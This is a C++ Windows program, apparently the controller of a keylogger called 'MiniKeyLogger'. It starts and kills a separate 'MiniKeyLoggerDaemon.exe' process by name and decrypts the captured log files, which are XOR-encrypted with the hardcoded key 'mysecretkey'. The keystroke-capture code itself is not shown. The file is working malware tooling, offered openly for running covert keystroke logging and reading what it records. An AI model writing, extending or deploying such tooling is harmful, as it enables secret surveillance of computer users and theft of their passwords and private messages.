#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>
#include <string>

std::string xorEncryptDecrypt(const std::string& input, const std::string& key) {
    std::string output = input;

    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = input[i] ^ key[i % key.length()];
    }

    return output;
}

bool StartKeyLoggerDaemon() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA("MiniKeyLoggerDaemon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "Failed to start keylogger daemon. Error: " << GetLastError() << std::endl;
        return false;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

bool StopKeyLoggerDaemon() {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    bool result = false;

    if (Process32First(hSnapShot, &pEntry)) {
        do {
            if (std::string(pEntry.szExeFile) == "MiniKeyLoggerDaemon.exe") {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pEntry.th32ProcessID);
                if (hProcess != NULL) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                    result = true;
                }
                break;
            }
        } while (Process32Next(hSnapShot, &pEntry));
    }
    CloseHandle(hSnapShot);
    return result;
}

void DecryptLogFile(const std::string& filePath) {
    std::string key = "mysecretkey";  // Must match the key used for encryption
    std::ifstream inFile(filePath, std::ios::in | std::ios::binary | std::ios::ate);
    if (!inFile.is_open()) {
        std::cerr << "Failed to open file for reading." << std::endl;
        return;
    }

    std::streampos fileSize = inFile.tellg();
    std::string encryptedContent(fileSize, '\0');

    inFile.seekg(0, std::ios::beg);
    inFile.read(&encryptedContent[0], fileSize);
    inFile.close();

    std::string decryptedContent = xorEncryptDecrypt(encryptedContent, key);
    std::cout << "Decrypted Content:\n" << decryptedContent << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: MiniKeyLogger.exe [start|stop|decrypt <path>]" << std::endl;
        return 1;
    }

    std::string command(argv[1]);
    if (command == "start") {
        if (StartKeyLoggerDaemon()) {
            std::cout << "Keylogger daemon started." << std::endl;
        }
    }
    else if (command == "stop") {
        if (StopKeyLoggerDaemon()) {
            std::cout << "Keylogger daemon stopped." << std::endl;
        }
        else {
            std::cout << "Failed to stop keylogger daemon." << std::endl;
        }
    }
    else if (command == "decrypt" && argc == 3) {
        DecryptLogFile(argv[2]);
    }
    else {
        std::cout << "Invalid command." << std::endl;
    }

    return 0;
}
